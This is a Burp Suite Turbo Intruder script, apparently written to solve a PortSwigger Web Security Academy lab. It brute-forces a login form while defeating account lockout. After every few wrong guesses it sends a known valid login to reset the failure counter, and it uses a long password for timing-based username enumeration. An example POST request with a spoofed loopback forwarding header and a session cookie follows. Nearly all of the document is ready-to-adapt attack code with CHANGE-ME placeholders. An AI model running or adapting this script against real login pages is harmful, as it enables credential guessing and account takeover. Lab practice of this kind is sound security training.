#Michael N (MM0) || TURBO INTRUDER BURP SUITE SCRIPT FOR SENDING A CORRECT LOGIN TO BY PASS ACCOUNT BLOCKING.  


#“Account Bypass Turbo Intruder Script”
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False
                           )
    usernameValid = 'wiener' #CHANGE-ME**: to the valid username 
    passwordValid = 'peter'  #CHANGE-ME**: to the valid password 

    veryLongPassword = 'VeRyLoNgPaSsWoRd!123456789' #used for timing attacks!
    request_count = 0

    for word in open('C:\Users\micha\Desktop\Burp-Suite-Stuff\usernames_authLAB.txt.txt'): #CHANGE-ME**:  add password list file path here... 
        engine.queue(target.req, [word.rstrip(), veryLongPassword])
        request_count += 1  # Increment the counter for each request
        
        if request_count % 2 == 0: #CHANGE-ME**: CHANGE THIS BASED OFF OF THE NUMBER OF INCORRECT PASSWORD ATTEMPTS ALLOWED, FOR EXAMPLE IF AFTER 2 INCORRECT WE GET AN BLOCK, THE SET THE MOD TO 2... 
            engine.queue(target.req, [usernameValid, passwordValid])
            request_count = 0  
        else:
            print('')  # Print an empty line (optional)

def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length, and req.response
    if req.status != 404:
        table.add(req)

'''
EXAMPLE http request setup: 

POST /login HTTP/2
Host: 0ae100a904bbd58981887a2b005f0050.web-security-academy.net
Cookie: session=4W5mDv3fZS59i9hoeJUfEhC7zJ2pnKvv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://michael-kali.blogspot.com/ <-- My blog 
Referer: https://michael-kali.blogspot.com/ <-- My blog 
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
x-forward-for: 127.0.0.1

username=%s&password=%s
    

'''